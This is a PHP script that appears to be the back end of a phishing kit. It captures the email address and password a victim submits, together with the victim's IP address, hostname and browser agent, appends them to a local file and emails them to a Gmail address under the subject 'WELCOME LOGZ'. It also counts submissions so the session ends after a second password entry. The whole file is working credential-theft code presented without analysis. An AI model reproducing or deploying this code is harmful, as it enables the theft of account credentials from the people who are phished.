<?php
session_start();
require 'blocker.php';

//if there is a password to post
if(isset($_POST['postpaswrd'])){
    
    
//get the values    

$stremail = $_POST['postemail'];
$strPassword = $_POST['postpaswrd'];
$strdomain=$_POST['postdomain'];

//Getting user ip & hostname
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$agent = @$_SERVER['HTTP_USER_AGENT'];





//Getting UserID info from Session
$_SESSION['username'] = $username = $stremail;
$_SESSION['password'] = $password = $strPassword;
$passchk = strlen($password);


$jayd="==================+[ User Info - Cs50 ]+==================
Email: $username
Password   : $password
-------------------+	+---------------------
Client IP: $ip
Check IP: http://goodherbwebmart.com/
Hostname: $hostname
Agent: $agent
-----------------+  +-----------------";

$fp = fopen('formdata.txt','a');
$savestring = $jayd."\n";
fwrite($fp, $savestring);
fclose($fp);

$recipient="ronenamir069@gmail.com";
$subject ="WELCOME LOGZ ".$strdomain."\n";
$headers = "From: A@ZLogs";



//set count 
if ((strPassword!=='') || (strPassword!==NULL)){
$_SESSION['count'] = $_SESSION['count'] + 1;
}else{
$_SESSION['count']=1;
}
echo $_SESSION['count'];

    mail($recipient,$subject,$jayd,$headers);
   //destroy session if its counted twice
   if ($_SESSION['count']=="2"){
   unset($_SESSION["count"]);
session_destroy();
}
}
?>